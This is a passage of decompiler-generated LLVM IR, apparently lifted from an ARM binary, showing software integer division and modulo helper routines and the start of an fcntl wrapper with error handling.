  %v10_133b8 = icmp eq i32 %v1_133b8, %arg2
  br i1 %v10_133b8, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_133b8, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_133b8 = icmp ult i32 %v1_133b8, %arg2
  br i1 %v4_133b8, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_133c0 = and i32 %v1_133b0, %arg2
  %v8_133c0 = icmp eq i32 %v6_133c0, 0
  br i1 %v8_133c0, label %.thread67, label %dec_label_pc_133d0.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_133c4 = phi i32 [ %v1_133b8, %bb75 ], [ 0, %.thread65 ]
  %v3_133c4 = and i32 %v1_133c4, %v1_133b0
  br label %bb76

dec_label_pc_133d0.preheader:                     ; preds = %bb75
  %v2_133d099 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_133d099, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_13460, %bb74, %bb89, %bb84, %dec_label_pc_13430, %.thread67
  %v5_133c8 = phi i32 [ %v1_133b8, %bb74 ], [ %v3_133c4, %.thread67 ], [ %v1_1340c.v6_1340c.v6_13414.v6_1341c, %dec_label_pc_13430 ], [ 0, %bb84 ], [ %v1_13464, %dec_label_pc_13460 ], [ %v2_13460, %bb89 ]
  ret i32 %v5_133c8

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_133d0.preheader
  %v0_133e4.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_133d0.preheader ], [ %v4_133d8, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_133d0.preheader ], [ %v2_133dc11, %.thread1.thread9 ]
  br label %dec_label_pc_133e4thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_133d0.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_133dc11, %.thread1.thread9 ], [ 0, %dec_label_pc_133d0.preheader ]
  %v0_133e4.pr33100 = phi i32 [ %v4_133d8, %.thread1.thread9 ], [ %arg2, %dec_label_pc_133d0.preheader ]
  %v4_133d4 = icmp ult i32 %v0_133e4.pr33100, %v1_133b8
  br i1 %v4_133d4, label %bb78, label %dec_label_pc_133e4thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_133d8 = and i32 %v0_133e4.pr33100, 268435456
  %v3_133d8 = icmp eq i32 %v2_133d8, 0
  %v4_133d8 = mul i32 %v0_133e4.pr33100, 16
  br i1 %v3_133d8, label %.thread1.thread9, label %dec_label_pc_133e4.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_133dc11 = add i32 %storemerge101, 4
  %v2_133d0 = icmp ugt i32 %v4_133d8, 268435455
  br i1 %v2_133d0, label %.thread, label %bb77

dec_label_pc_133e4thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_133e4thread-pre-split.loopexit

dec_label_pc_133e4thread-pre-split.loopexit:      ; preds = %dec_label_pc_133e4thread-pre-split.loopexit.loopexit, %.thread
  %v0_133e4.pr3398 = phi i32 [ %v0_133e4.pr33.lcssa, %.thread ], [ %v0_133e4.pr33100, %dec_label_pc_133e4thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_133e4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_133e4thread-pre-split

dec_label_pc_133e4thread-pre-split:               ; preds = %.thread4, %dec_label_pc_133e4thread-pre-split.loopexit
  %v1_133f039 = phi i32 [ %storemerge95, %dec_label_pc_133e4thread-pre-split.loopexit ], [ %v2_133f0, %.thread4 ]
  %v0_133e4.pr = phi i32 [ %v0_133e4.pr3398, %dec_label_pc_133e4thread-pre-split.loopexit ], [ %v3_133ec, %.thread4 ]
  br label %dec_label_pc_133e4

dec_label_pc_133e4.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_133e4

dec_label_pc_133e4:                               ; preds = %dec_label_pc_133e4.loopexit, %dec_label_pc_133e4thread-pre-split
  %v0_133f8.pr = phi i32 [ %v1_133f039, %dec_label_pc_133e4thread-pre-split ], [ %storemerge101, %dec_label_pc_133e4.loopexit ]
  %v1_133ec = phi i32 [ %v0_133e4.pr, %dec_label_pc_133e4thread-pre-split ], [ %v4_133d8, %dec_label_pc_133e4.loopexit ]
  %v2_133e4 = icmp slt i32 %v1_133ec, 0
  br i1 %v2_133e4, label %dec_label_pc_133f8, label %bb79

bb79:                                             ; preds = %dec_label_pc_133e4
  %v4_133e8 = icmp ult i32 %v1_133ec, %v1_133b8
  br i1 %v4_133e8, label %.thread4, label %dec_label_pc_133f8

.thread4:                                         ; preds = %bb79
  %v3_133ec = mul i32 %v1_133ec, 2
  %v2_133f0 = add i32 %v0_133f8.pr, 1
  br label %dec_label_pc_133e4thread-pre-split

dec_label_pc_133f8:                               ; preds = %bb79, %dec_label_pc_133e4
  %v2_133f8 = add i32 %v0_133f8.pr, -3
  %v5_133fc = icmp slt i32 %v0_133f8.pr, 3
  br i1 %v5_133fc, label %dec_label_pc_1343c, label %dec_label_pc_13400

dec_label_pc_13400:                               ; preds = %dec_label_pc_133f8, %bb83
  %v6_13428 = phi i32 [ %v0_13430, %bb83 ], [ %v2_133f8, %dec_label_pc_133f8 ]
  %v1_13404 = phi i32 [ %v1_1340c.v6_1340c.v6_13414.v6_1341c, %bb83 ], [ %v1_133b8, %dec_label_pc_133f8 ]
  %v3_1342412 = phi i32 [ %v3_13424, %bb83 ], [ %v1_133ec, %dec_label_pc_133f8 ]
  %v3_13400 = icmp ult i32 %v1_13404, %v3_1342412
  %v3_13404 = select i1 %v3_13400, i32 0, i32 %v3_1342412
  %v1_1340c = sub i32 %v1_13404, %v3_13404
  %v4_13408 = udiv i32 %v3_1342412, 2
  %v6_13408 = icmp ult i32 %v1_1340c, %v4_13408
  %v6_1340c = select i1 %v6_13408, i32 0, i32 %v4_13408
  %v1_1340c.v6_1340c = sub i32 %v1_1340c, %v6_1340c
  %.demorgan = and i1 %v3_13400, %v6_13408
  %v4_13410 = udiv i32 %v3_1342412, 4
  %v6_13410 = icmp ult i32 %v1_1340c.v6_1340c, %v4_13410
  %v6_13414 = select i1 %v6_13410, i32 0, i32 %v4_13410
  %v1_1340c.v6_1340c.v6_13414 = sub i32 %v1_1340c.v6_1340c, %v6_13414
  %.demorgan71 = and i1 %.demorgan, %v6_13410
  %v4_13418 = udiv i32 %v3_1342412, 8
  %v6_13418 = icmp ult i32 %v1_1340c.v6_1340c.v6_13414, %v4_13418
  %v6_1341c = select i1 %v6_13418, i32 0, i32 %v4_13418
  %v1_1340c.v6_1340c.v6_13414.v6_1341c = sub i32 %v1_1340c.v6_1340c.v6_13414, %v6_1341c
  %.demorgan72 = and i1 %.demorgan71, %v6_13418
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_13400
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_13400, %bb80
  %v2_13420 = add i32 %v1_1340c.v6_1340c.v6_13414.v6_1341c, -1
  %v4_13420 = sub i32 0, %v1_1340c.v6_1340c.v6_13414.v6_1341c
  %v5_13420 = and i32 %v1_1340c.v6_1340c.v6_13414.v6_1341c, %v4_13420
  %v3_13424 = udiv i32 %v3_1342412, 16
  %v5_13428 = icmp slt i32 %v1_1340c.v6_1340c.v6_13414.v6_1341c, 1
  br i1 %v5_13428, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_13428 = add i32 %v6_13428, -4
  %v9_13428 = sub i32 3, %v6_13428
  %v10_13428 = and i32 %v9_13428, %v6_13428
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_13430 = phi i32 [ %v6_13428, %bb81 ], [ %v7_13428, %bb82 ]
  %v0_1342c15.in = phi i32 [ %v2_13420, %bb81 ], [ %v7_13428, %bb82 ]
  %v1_1342c14.in = phi i32 [ %v5_13420, %bb81 ], [ %v10_13428, %bb82 ]
  %v1_1342c14 = icmp slt i32 %v1_1342c14.in, 0
  %v0_1342c15 = icmp slt i32 %v0_1342c15.in, 0
  %v2_1342c = xor i1 %v0_1342c15, %v1_1342c14
  br i1 %v2_1342c, label %dec_label_pc_13430, label %dec_label_pc_13400

dec_label_pc_13430:                               ; preds = %bb83
  %v1_13430 = urem i32 %v0_13430, 4
  %v2_13430 = icmp eq i32 %v1_13430, 0
  br i1 %v2_13430, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_13430
  %v3_13434 = icmp eq i32 %v1_1340c.v6_1340c.v6_13414.v6_1341c, 0
  br i1 %v3_13434, label %bb76, label %dec_label_pc_1343c

dec_label_pc_1343c:                               ; preds = %bb84, %dec_label_pc_133f8
  %v0_13450 = phi i32 [ %v3_13424, %bb84 ], [ %v1_133ec, %dec_label_pc_133f8 ]
  %v1_1344c = phi i32 [ %v1_1340c.v6_1340c.v6_13414.v6_1341c, %bb84 ], [ %v1_133b8, %dec_label_pc_133f8 ]
  %v0_1343c = phi i32 [ %v0_13430, %bb84 ], [ %v2_133f8, %dec_label_pc_133f8 ]
  %v5_13440 = icmp slt i32 %v0_1343c, -2
  br i1 %v5_13440, label %dec_label_pc_13460, label %dec_label_pc_13444

dec_label_pc_13444:                               ; preds = %dec_label_pc_1343c
  %v8_1343c = icmp eq i32 %v0_1343c, -2
  br i1 %v8_1343c, label %dec_label_pc_13454, label %dec_label_pc_13448

dec_label_pc_13448:                               ; preds = %dec_label_pc_13444
  %v3_13448 = icmp ult i32 %v1_1344c, %v0_13450
  br i1 %v3_13448, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_13448
  %v2_13448 = sub i32 %v1_1344c, %v0_13450
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_13448, %bb85
  %v0_1345452 = phi i32 [ %v1_1344c, %dec_label_pc_13448 ], [ %v2_13448, %bb85 ]
  %v3_13450 = udiv i32 %v0_13450, 2
  br label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_13444, %bb86
  %v0_1345c = phi i32 [ %v0_13450, %dec_label_pc_13444 ], [ %v3_13450, %bb86 ]
  %v1_13458 = phi i32 [ %v1_1344c, %dec_label_pc_13444 ], [ %v0_1345452, %bb86 ]
  %v3_13454 = icmp ult i32 %v1_13458, %v0_1345c
  br i1 %v3_13454, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_13454
  %v2_13454 = sub i32 %v1_13458, %v0_1345c
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_13454, %bb87
  %v0_1346055 = phi i32 [ %v1_13458, %dec_label_pc_13454 ], [ %v2_13454, %bb87 ]
  %v3_1345c = udiv i32 %v0_1345c, 2
  br label %dec_label_pc_13460

dec_label_pc_13460:                               ; preds = %dec_label_pc_1343c, %bb88
  %v2_13464 = phi i32 [ %v0_13450, %dec_label_pc_1343c ], [ %v3_1345c, %bb88 ]
  %v1_13464 = phi i32 [ %v1_1344c, %dec_label_pc_1343c ], [ %v0_1346055, %bb88 ]
  %v3_13460 = icmp ult i32 %v1_13464, %v2_13464
  br i1 %v3_13460, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_13460
  %v2_13460 = sub i32 %v1_13464, %v2_13464
  br label %bb76

dec_label_pc_1346c:                               ; preds = %dec_label_pc_133b0
  %v0_1346c = load i32, i32* @lr, align 4
  %v0_13470 = call i32 @function_13560()
  call void @__pseudo_branch(i32 %v0_1346c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13464, { 1, 2, 0 }
  uselistorder i32 %v0_13450, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13430, { 1, 0, 2 }
  uselistorder i32 %v7_13428, { 1, 0 }
  uselistorder i32 %v3_13424, { 1, 0 }
  uselistorder i32 %v1_1340c.v6_1340c.v6_13414.v6_1341c, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_13418, { 1, 0 }
  uselistorder i32 %v4_13410, { 1, 0 }
  uselistorder i32 %v4_13408, { 1, 0 }
  uselistorder i32 %v6_13428, { 3, 0, 2, 1 }
  uselistorder i32 %v2_133f8, { 1, 0 }
  uselistorder i32 %v1_133ec, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_133d8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_133e4.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_133b8, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_13460, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_13454, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_13400, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_1347c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1347c:
  store i32 %arg1, i32* @r0, align 4
  %v2_1347c = icmp eq i32 %arg2, 0
  br i1 %v2_1347c, label %dec_label_pc_13550, label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_1347c
  %v1_1347c = icmp slt i32 %arg2, 0
  br i1 %v1_1347c, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_13484
  %v2_13484 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_13484, %bb
  %v4_1349c = phi i32 [ %arg2, %dec_label_pc_13484 ], [ %v2_13484, %bb ]
  %v0_13488 = load i32, i32* @r0, align 4
  %v1_13488 = icmp slt i32 %v0_13488, 0
  br i1 %v1_13488, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_1348c = sub i32 0, %v0_13488
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_13494 = phi i32 [ %v0_13488, %bb79 ], [ %v2_1348c, %bb80 ]
  %v1_13490 = add i32 %v4_1349c, -1
  %v7_13490 = icmp eq i32 %v4_1349c, 1
  br i1 %v7_13490, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_13494 = icmp eq i32 %v1_13494, %v4_1349c
  br i1 %v10_13494, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_13494 = icmp ult i32 %v1_13494, %v4_1349c
  br i1 %v4_13494, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_1349c = and i32 %v1_13490, %v4_1349c
  %v8_1349c = icmp eq i32 %v6_1349c, 0
  br i1 %v8_1349c, label %.thread72, label %dec_label_pc_134ac.preheader

dec_label_pc_134ac.preheader:                     ; preds = %bb84
  %v2_134ac109 = icmp ugt i32 %v4_1349c, 268435455
  br i1 %v2_134ac109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_134a064 = phi i32 [ %v1_13494, %bb84 ], [ 0, %.thread70 ]
  %v3_134a0 = and i32 %v1_134a064, %v1_13490
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_134ac.preheader
  %v0_134c0.pr35.lcssa = phi i32 [ %v4_1349c, %dec_label_pc_134ac.preheader ], [ %v4_134b4, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_134ac.preheader ], [ %v2_134b89, %.thread2.thread7 ]
  br label %dec_label_pc_134c0thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_134ac.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_134b89, %.thread2.thread7 ], [ 0, %dec_label_pc_134ac.preheader ]
  %v0_134c0.pr35110 = phi i32 [ %v4_134b4, %.thread2.thread7 ], [ %v4_1349c, %dec_label_pc_134ac.preheader ]
  %v4_134b0 = icmp ult i32 %v0_134c0.pr35110, %v1_13494
  br i1 %v4_134b0, label %bb86, label %dec_label_pc_134c0thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_134b4 = and i32 %v0_134c0.pr35110, 268435456
  %v3_134b4 = icmp eq i32 %v2_134b4, 0
  %v4_134b4 = mul i32 %v0_134c0.pr35110, 16
  br i1 %v3_134b4, label %.thread2.thread7, label %dec_label_pc_134c0.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_134b89 = add i32 %storemerge111, 4
  %v2_134ac = icmp ugt i32 %v4_134b4, 268435455
  br i1 %v2_134ac, label %.thread1, label %bb85

dec_label_pc_134c0thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_134c0thread-pre-split.loopexit

dec_label_pc_134c0thread-pre-split.loopexit:      ; preds = %dec_label_pc_134c0thread-pre-split.loopexit.loopexit, %.thread1
  %v0_134c0.pr35108 = phi i32 [ %v0_134c0.pr35.lcssa, %.thread1 ], [ %v0_134c0.pr35110, %dec_label_pc_134c0thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_134c0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_134c0thread-pre-split

dec_label_pc_134c0thread-pre-split:               ; preds = %.thread4, %dec_label_pc_134c0thread-pre-split.loopexit
  %v1_134cc41 = phi i32 [ %storemerge105, %dec_label_pc_134c0thread-pre-split.loopexit ], [ %v2_134cc, %.thread4 ]
  %v2_134c436 = phi i32 [ %v1_13494, %dec_label_pc_134c0thread-pre-split.loopexit ], [ %v2_134c4, %.thread4 ]
  %v0_134c0.pr = phi i32 [ %v0_134c0.pr35108, %dec_label_pc_134c0thread-pre-split.loopexit ], [ %v3_134c8, %.thread4 ]
  br label %dec_label_pc_134c0

dec_label_pc_134c0.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_134c0

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134c0.loopexit, %dec_label_pc_134c0thread-pre-split
  %v0_134d4.pr = phi i32 [ %v1_134cc41, %dec_label_pc_134c0thread-pre-split ], [ %storemerge111, %dec_label_pc_134c0.loopexit ]
  %v2_134c4 = phi i32 [ %v2_134c436, %dec_label_pc_134c0thread-pre-split ], [ %v1_13494, %dec_label_pc_134c0.loopexit ]
  %v1_134c8 = phi i32 [ %v0_134c0.pr, %dec_label_pc_134c0thread-pre-split ], [ %v4_134b4, %dec_label_pc_134c0.loopexit ]
  %v2_134c0 = icmp slt i32 %v1_134c8, 0
  br i1 %v2_134c0, label %dec_label_pc_134d4, label %bb87

bb87:                                             ; preds = %dec_label_pc_134c0
  %v4_134c4 = icmp ult i32 %v1_134c8, %v2_134c4
  br i1 %v4_134c4, label %.thread4, label %dec_label_pc_134d4

.thread4:                                         ; preds = %bb87
  %v3_134c8 = mul i32 %v1_134c8, 2
  %v2_134cc = add i32 %v0_134d4.pr, 1
  br label %dec_label_pc_134c0thread-pre-split

dec_label_pc_134d4:                               ; preds = %bb87, %dec_label_pc_134c0
  %v2_134d4 = add i32 %v0_134d4.pr, -3
  %v5_134d8 = icmp slt i32 %v0_134d4.pr, 3
  br i1 %v5_134d8, label %dec_label_pc_13518, label %dec_label_pc_134dc

dec_label_pc_134dc:                               ; preds = %dec_label_pc_134d4, %bb91
  %v6_13504 = phi i32 [ %v0_1350c, %bb91 ], [ %v2_134d4, %dec_label_pc_134d4 ]
  %v1_134e0 = phi i32 [ %v1_134e8.v6_134e8.v6_134f0.v6_134f8, %bb91 ], [ %v2_134c4, %dec_label_pc_134d4 ]
  %v3_1350010 = phi i32 [ %v3_13500, %bb91 ], [ %v1_134c8, %dec_label_pc_134d4 ]
  %v3_134dc = icmp ult i32 %v1_134e0, %v3_1350010
  %v3_134e0 = select i1 %v3_134dc, i32 0, i32 %v3_1350010
  %v1_134e8 = sub i32 %v1_134e0, %v3_134e0
  %v4_134e4 = udiv i32 %v3_1350010, 2
  %v6_134e4 = icmp ult i32 %v1_134e8, %v4_134e4
  %v6_134e8 = select i1 %v6_134e4, i32 0, i32 %v4_134e4
  %v1_134e8.v6_134e8 = sub i32 %v1_134e8, %v6_134e8
  %.demorgan = and i1 %v3_134dc, %v6_134e4
  %v4_134ec = udiv i32 %v3_1350010, 4
  %v6_134ec = icmp ult i32 %v1_134e8.v6_134e8, %v4_134ec
  %v6_134f0 = select i1 %v6_134ec, i32 0, i32 %v4_134ec
  %v1_134e8.v6_134e8.v6_134f0 = sub i32 %v1_134e8.v6_134e8, %v6_134f0
  %.demorgan76 = and i1 %.demorgan, %v6_134ec
  %v4_134f4 = udiv i32 %v3_1350010, 8
  %v6_134f4 = icmp ult i32 %v1_134e8.v6_134e8.v6_134f0, %v4_134f4
  %v6_134f8 = select i1 %v6_134f4, i32 0, i32 %v4_134f4
  %v1_134e8.v6_134e8.v6_134f0.v6_134f8 = sub i32 %v1_134e8.v6_134e8.v6_134f0, %v6_134f8
  %.demorgan77 = and i1 %.demorgan76, %v6_134f4
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_134dc
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_134dc, %bb88
  %v2_134fc = add i32 %v1_134e8.v6_134e8.v6_134f0.v6_134f8, -1
  %v4_134fc = sub i32 0, %v1_134e8.v6_134e8.v6_134f0.v6_134f8
  %v5_134fc = and i32 %v1_134e8.v6_134e8.v6_134f0.v6_134f8, %v4_134fc
  %v3_13500 = udiv i32 %v3_1350010, 16
  %v5_13504 = icmp slt i32 %v1_134e8.v6_134e8.v6_134f0.v6_134f8, 1
  br i1 %v5_13504, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_13504 = add i32 %v6_13504, -4
  %v9_13504 = sub i32 3, %v6_13504
  %v10_13504 = and i32 %v9_13504, %v6_13504
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_1350c = phi i32 [ %v6_13504, %bb89 ], [ %v7_13504, %bb90 ]
  %v0_1350813.in = phi i32 [ %v2_134fc, %bb89 ], [ %v7_13504, %bb90 ]
  %v1_1350812.in = phi i32 [ %v5_134fc, %bb89 ], [ %v10_13504, %bb90 ]
  %v1_1350812 = icmp slt i32 %v1_1350812.in, 0
  %v0_1350813 = icmp slt i32 %v0_1350813.in, 0
  %v2_13508 = xor i1 %v0_1350813, %v1_1350812
  br i1 %v2_13508, label %dec_label_pc_1350c, label %dec_label_pc_134dc

dec_label_pc_1350c:                               ; preds = %bb91
  %v1_1350c = urem i32 %v0_1350c, 4
  %v2_1350c = icmp eq i32 %v1_1350c, 0
  br i1 %v2_1350c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_1350c
  %v3_13510 = icmp eq i32 %v1_134e8.v6_134e8.v6_134f0.v6_134f8, 0
  br i1 %v3_13510, label %.thread6, label %dec_label_pc_13518

dec_label_pc_13518:                               ; preds = %bb92, %dec_label_pc_134d4
  %v0_1352c = phi i32 [ %v3_13500, %bb92 ], [ %v1_134c8, %dec_label_pc_134d4 ]
  %v1_13528 = phi i32 [ %v1_134e8.v6_134e8.v6_134f0.v6_134f8, %bb92 ], [ %v2_134c4, %dec_label_pc_134d4 ]
  %v0_13518 = phi i32 [ %v0_1350c, %bb92 ], [ %v2_134d4, %dec_label_pc_134d4 ]
  %v5_1351c = icmp slt i32 %v0_13518, -2
  br i1 %v5_1351c, label %dec_label_pc_1353c, label %dec_label_pc_13520

dec_label_pc_13520:                               ; preds = %dec_label_pc_13518
  %v8_13518 = icmp eq i32 %v0_13518, -2
  br i1 %v8_13518, label %dec_label_pc_13530, label %dec_label_pc_13524

dec_label_pc_13524:                               ; preds = %dec_label_pc_13520
  %v3_13524 = icmp ult i32 %v1_13528, %v0_1352c
  br i1 %v3_13524, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_13524
  %v2_13524 = sub i32 %v1_13528, %v0_1352c
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_13524, %bb93
  %v0_1353054 = phi i32 [ %v1_13528, %dec_label_pc_13524 ], [ %v2_13524, %bb93 ]
  %v3_1352c = udiv i32 %v0_1352c, 2
  br label %dec_label_pc_13530

dec_label_pc_13530:                               ; preds = %dec_label_pc_13520, %bb94
  %v0_13538 = phi i32 [ %v0_1352c, %dec_label_pc_13520 ], [ %v3_1352c, %bb94 ]
  %v1_13534 = phi i32 [ %v1_13528, %dec_label_pc_13520 ], [ %v0_1353054, %bb94 ]
  %v3_13530 = icmp ult i32 %v1_13534, %v0_13538
  br i1 %v3_13530, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_13530
  %v2_13530 = sub i32 %v1_13534, %v0_13538
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_13530, %bb95
  %v0_1353c57 = phi i32 [ %v1_13534, %dec_label_pc_13530 ], [ %v2_13530, %bb95 ]
  %v3_13538 = udiv i32 %v0_13538, 2
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13518, %bb96
  %v2_13540 = phi i32 [ %v0_1352c, %dec_label_pc_13518 ], [ %v3_13538, %bb96 ]
  %v1_13540 = phi i32 [ %v1_13528, %dec_label_pc_13518 ], [ %v0_1353c57, %bb96 ]
  %v3_1353c = icmp ult i32 %v1_13540, %v2_13540
  br i1 %v3_1353c, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_1353c
  %v2_1353c = sub i32 %v1_13540, %v2_13540
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1353c, %bb83, %.thread72, %dec_label_pc_1350c, %bb92, %bb97
  %v1_13548 = phi i32 [ %v1_134e8.v6_134e8.v6_134f0.v6_134f8, %dec_label_pc_1350c ], [ 0, %bb92 ], [ %v1_13540, %dec_label_pc_1353c ], [ %v2_1353c, %bb97 ], [ %v3_134a0, %.thread72 ], [ %v1_13494, %bb83 ]
  br i1 %v1_13488, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_13548 = sub i32 0, %v1_13548
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_1354c = phi i32 [ %v1_13548, %.thread6 ], [ %v2_13548, %bb98 ]
  ret i32 %v1_1354c

dec_label_pc_13550:                               ; preds = %dec_label_pc_1347c
  %v0_13550 = load i32, i32* @lr, align 4
  %v0_13554 = call i32 @function_13560()
  call void @__pseudo_branch(i32 %v0_13550)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1352c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1350c, { 1, 0, 2 }
  uselistorder i32 %v7_13504, { 1, 0 }
  uselistorder i32 %v3_13500, { 1, 0 }
  uselistorder i32 %v1_134e8.v6_134e8.v6_134f0.v6_134f8, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_134f4, { 1, 0 }
  uselistorder i32 %v4_134ec, { 1, 0 }
  uselistorder i32 %v4_134e4, { 1, 0 }
  uselistorder i32 %v6_13504, { 3, 0, 2, 1 }
  uselistorder i32 %v2_134d4, { 1, 0 }
  uselistorder i32 %v1_134c8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_134c4, { 1, 0, 3, 2 }
  uselistorder i32 %v4_134b4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_134c0.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13494, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_1349c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @function_13560, { 2, 1, 0 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_13530, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_134dc, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_13560() local_unnamed_addr {
dec_label_pc_13560:
  %v1_13560 = load i32, i32* @r0, align 4
  ret i32 %v1_13560
}

define i32 @function_13564(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13564:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_13564 = load i32, i32* @r2, align 4
  %v1_13574 = add i32 %arg2, -12
  store i32 %v6_13564, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_13574, 2
  br i1 %tmp, label %dec_label_pc_1359c, label %dec_label_pc_13594

dec_label_pc_13594:                               ; preds = %dec_label_pc_13564
  %v0_13594 = call i32 @function_135d8()
  br label %dec_label_pc_135c8

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13564
  %v2_135a4 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_135a4, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_135a4, -4095
  br i1 %tmp8, label %dec_label_pc_135c8, label %dec_label_pc_135b4

dec_label_pc_135b4:                               ; preds = %dec_label_pc_1359c
  %v0_135b4 = call i32 @function_13c28()
  %v0_135b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_135b8 = sub i32 0, %v0_135b8
  %v2_135bc = inttoptr i32 %v0_135b4 to i32*
  store i32 %v1_135b8, i32* %v2_135bc, align 4
